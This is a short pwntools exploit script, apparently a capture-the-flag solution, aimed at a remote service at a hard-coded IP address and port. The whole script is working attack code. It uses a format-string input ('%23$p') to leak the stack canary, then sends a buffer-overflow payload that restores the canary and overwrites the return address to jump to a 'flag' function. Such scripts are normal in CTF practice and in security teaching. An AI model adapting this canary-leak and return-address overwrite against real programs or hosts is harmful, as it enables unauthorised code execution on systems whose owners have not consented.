from pwn import *
r=remote('220.249.52.133',36173)

r.recvuntil('3. Exit the battle')
r.sendline('2')

r.sendline('%23$p')

r.recvuntil('0x')
canary=int(r.recv(16),16)
print (canary)

flag_addr=0x4008da
payload='a'*0x88+p64(canary)+'a'*8+p64(flag_addr)
r.recvuntil('3. Exit the battle')
r.sendline('1')
r.sendline(payload)

r.interactive()
